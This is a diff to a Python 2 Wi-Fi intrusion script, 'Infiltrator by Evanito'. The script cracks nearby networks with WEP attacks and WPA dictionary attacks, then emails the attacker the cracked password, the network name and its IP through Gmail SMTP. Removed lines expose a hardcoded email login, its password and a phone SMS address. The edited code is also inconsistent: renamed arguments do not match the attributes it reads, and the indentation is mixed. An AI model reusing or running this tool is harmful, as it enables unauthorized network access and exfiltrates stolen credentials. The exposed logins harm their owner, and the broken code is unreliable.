@@ -10,29 +10,34 @@ import os
 import argparse
 
 #TODO: 
-#Make faulty AP detection
-#Auto-select wifi interface
-#Make more reliable
-#Auto exploit?
+#Make faulty AP detection (Blacklist ones that fail consistently)
+#Auto-select wifi interface (Strongest or random)
+#Make more reliable in general
+#Auto exploit once connected
 #BSSID instead of ESSID
 
 # Default Settings, overwritten by args:
-interface = 'wlan2'
+interface = 'wlan0'
 test_server = 'www.google.com'
-username = 'pifiltrator@gmail.com'
-pwd = 'pifiltration'
-toaddrs = '6617334826@vtext.com'
-test_mode = True
-wpa_attack = True
+username = ''
+pwd = ''
+toaddrs = ''
+test_mode = False
+wpa_attack = False
 wpadriver = 'nl80211,wext' #Use 'wext' and/or 'nl80211'
-dictionary = '/root/Documents/rockyou.txt'
+dictionary = ''
 # End settings.
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-bg", "--background", help="Run in the background", action="store_true")
-parser.add_argument("-ac", "--autocrack", help="Run various automatic cracking programs once connected", action="store_true")
-parser.add_argument("-i", "--iface", help="Choose interface to use")
+parser.add_argument("-ac", "--autocrack", help="Run various automatic cracking programs once connected - W.I.P.", action="store_true")
+parser.add_argument("-i", "--interface", help="Choose wireless interface to use")
 parser.add_argument("-test", "--testmode", help="Will assume no internet connection when starting", action="store_true")
+parser.add_argument("-addy", "--address", help="Choose email address to receive notification email")
+parser.add_argument("-usr", "--username", help="Choose email address to send notification email, i.e.: user@gmail.com")
+parser.add_argument("-pwd", "--password", help="Choose email password to send notification email")
+parser.add_argument("-wpa", "--wpaattack", help="Enable the slower WPA cracking as last resort", action="store_true")
+parser.add_argument("-dict", "--dictionary", help="Identify dictionary to use for WPA cracking")
 args = parser.parse_args()
 
 subprocess.call(["sudo", "clear"])
@@ -44,6 +49,16 @@ if args.iface:
 	interface = args.iface
 if args.test:
     test_mode = True
+if args.address:
+	toaddrs = args.address
+if args.username:
+	username = args.username
+if args.password:
+	pwd = args.password
+if args.wpaattack:
+	wpa_attack = True
+if args.dictionary:
+	dictionary = args.dictionary
 
 print "Infiltrator by Evanito\n\nStarted, checking for internet..."
 
@@ -106,23 +121,26 @@ def connect_wifi(iface, ap, passwd):
         wep_connect(iface, ap, passwd)
 
 def send_email():
-    print "Sending success email..."
-    ni.ifaddresses(interface)
-    ip = ni.ifaddresses(interface)[2][0]['addr']
-    msg = "\r\n".join([
-        "From: %s" %(fromaddr),
-        "To: %s" %(toaddrs),
-        "Subject: Infiltration successful",
-        "",
-        "I'm in. My local IP is %s, Im on the network %s, and the password is %s" %(ip, essid, password)
-        ])
-    server = smtplib.SMTP('smtp.gmail.com:587')
-    server.ehlo()
-    server.starttls()
-    server.login(username, pwd)
-    server.sendmail(username, toaddrs, msg)
-    server.quit()
-    print 'Sent!'
+	if toaddrs != '' and username != '' and pwd != '':
+	    print "Sending success email..."
+	    ni.ifaddresses(interface)
+	    ip = ni.ifaddresses(interface)[2][0]['addr']
+        msg = "\r\n".join([
+            "From: %s" %(fromaddr),
+            "To: %s" %(toaddrs),
+            "Subject: Infiltration successful",
+            "",
+            "I'm in. My local IP is %s, Im on the network %s, and the password is %s" %(ip, essid, password)
+            ])
+        server = smtplib.SMTP('smtp.gmail.com:587')
+        server.ehlo()
+        server.starttls()
+        server.login(username, pwd)
+        server.sendmail(username, toaddrs, msg)
+        server.quit()
+        print 'Sent!'
+	else:
+		print "Email requirements not defined. Not sending success email."
 
 def crosscheck():
     networks = populate_known()
